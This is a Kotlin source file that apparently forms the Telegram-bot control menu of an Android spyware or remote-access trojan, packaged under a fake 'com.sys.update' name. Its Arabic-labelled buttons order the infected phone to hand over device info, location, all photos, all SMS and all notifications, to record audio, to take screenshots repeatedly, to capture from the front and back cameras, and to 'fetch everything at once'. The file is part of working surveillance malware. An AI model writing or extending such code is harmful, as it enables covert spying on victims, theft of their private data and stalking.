package com.sys.update

import org.json.JSONArray
import org.json.JSONObject

object KeyboardBuilder {

    fun mainMenu(): JSONObject {
        val rows = JSONArray()

        rows.put(row(btn("📊 معلومات الجهاز", "info")))
        rows.put(row(btn("📍 الموقع الحالي", "location")))
        rows.put(row(btn("📸 كل الصور", "photos_all")))
        rows.put(row(
            btn("📸 آخر 50", "photos_50"),
            btn("📸 آخر 200", "photos_200")
        ))
        rows.put(row(btn("📩 كل الرسائل SMS", "sms_all")))
        rows.put(row(btn("🔔 كل الإشعارات", "notifs_all")))
        rows.put(row(
            btn("🎤 بدء التسجيل", "audio_start"),
            btn("⏹ إيقاف التسجيل", "audio_stop")
        ))
        rows.put(row(btn("📷 لقطة شاشة الآن", "screen_once")))
        rows.put(row(
            btn("📷 لقطات كل 30s", "screen_loop_start"),
            btn("🛑 إيقاف اللقطات", "screen_loop_stop")
        ))
        rows.put(row(
            btn("🤳 كاميرا أمامية", "cam_front"),
            btn("📸 كاميرا خلفية", "cam_back")
        ))
        rows.put(row(btn("🚀 جلب كل شي مع بعض", "fetch_all")))
        rows.put(row(btn("🔄 تحديث القائمة", "menu")))

        return JSONObject().apply { put("inline_keyboard", rows) }
    }

    fun backToMenu(): JSONObject {
        val rows = JSONArray()
        rows.put(row(btn("🏠 القائمة الرئيسية", "menu")))
        return JSONObject().apply { put("inline_keyboard", rows) }
    }

    fun stopJob(jobId: String): JSONObject {
        val rows = JSONArray()
        rows.put(row(btn("🛑 إيقاف العملية", "stop_$jobId")))
        return JSONObject().apply { put("inline_keyboard", rows) }
    }

    private fun btn(text: String, callback: String): JSONObject =
        JSONObject().apply {
            put("text", text)
            put("callback_data", callback)
        }

    private fun row(vararg buttons: JSONObject): JSONArray =
        JSONArray().apply { buttons.forEach { put(it) } }
}
